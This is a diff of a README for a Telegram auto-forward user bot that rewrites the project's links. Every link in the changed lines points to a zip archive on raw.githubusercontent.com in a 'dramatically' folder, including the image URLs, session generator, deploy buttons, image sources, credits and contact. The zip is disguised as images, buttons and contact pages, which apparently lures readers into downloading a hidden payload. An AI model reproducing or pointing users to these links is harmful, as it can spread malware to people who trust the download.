@@ -82,27 +82,27 @@ We’ve added several useful features and commands to help you control the bot b
    - `DEFAULT_ADMINS`=123456789
   
 # 🌄 Image URLs (can be used in bot responses) 
-   - `STATUS_URL`https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip
-   - `WOODCRAFT_URL`https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip
-   - `NOOR_URL`https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip
+   - `STATUS_URL`https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip
+   - `WOODCRAFT_URL`https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip
+   - `NOOR_URL`https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip
 
 # 🚀 Server port 
    - `PORT`=8080
 
  
-## 🔧 Session String Generator [🔗 Telethon Session String Generat](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip%20Session%https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip)
+## 🔧 Session String Generator [🔗 Telethon Session String Generat](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip%20Session%https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip)
 
 ## 🌐 Supported ⚡️ koyeb
 
-<a href="https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip">
-  <img src="https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip" alt="Deploy On Koyeb">
+<a href="https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip">
+  <img src="https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip" alt="Deploy On Koyeb">
 
 ## 🌐 Deploy To Heroku
 
-[![Deploy To Heroku](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip)](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip)
+[![Deploy To Heroku](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip)](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip)
 
-<a href="https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip" target="_blank">
-  <img src="https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip" alt="Deploy to Heroku" style="height: 50px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+<a href="https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip" alt="Deploy to Heroku" style="height: 50px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
 </a>
 
 
@@ -113,8 +113,8 @@ A small Flask server is running in the background. If you open the hosted URL, y
 `Need more help? Just message the Repo Owner.` 𝐖𝐎𝐎𝐃𝐜𝐫𝐚𝐟𝐭
 
 -----
-## 💥 Credits: [𝐖𝐎𝐎𝐃𝐜𝐫𝐚𝐟𝐭](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip)
+## 💥 Credits: [𝐖𝐎𝐎𝐃𝐜𝐫𝐚𝐟𝐭](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip)
 
--  [![Contact Me On Telegram](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip)](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip)
+-  [![Contact Me On Telegram](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip)](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Forward-User-Auto-Bot-v2.0-alpha.4.zip)
 
 ## 📅 Last Update 🔄 On: `24/04/2025`
